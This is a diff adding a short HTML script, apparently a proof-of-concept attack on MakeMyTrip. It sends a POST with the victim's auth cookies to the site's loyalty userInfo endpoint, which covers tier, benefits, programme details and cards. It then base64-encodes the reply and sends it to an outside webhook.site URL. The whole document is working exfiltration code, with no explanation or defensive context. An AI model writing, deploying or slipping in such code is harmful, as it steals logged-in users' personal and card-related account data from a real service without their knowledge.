@@ -1,0 +1,28 @@
+<script>
+fetch("https://mapi.makemytrip.com/loyalty/userInfo?&region=in&currency=inr&user-currency=USD&language=eng", {
+  method: "POST",
+  credentials: "include", // include auth cookies
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    "lob":"ALL",
+    "tier":true,
+    "benefit":true,
+    "programDetails":true,
+    "cards":true,
+    "programDetailsTierBenefit":true,
+    "source":"PWA",
+    "platform":"web",
+    "page":"home"
+  })
+})
+.then(res => res.text())
+.then(data => {
+  fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
+    method: "POST",
+    mode: "no-cors",
+    body: btoa(data)
+  });
+});
+</script>
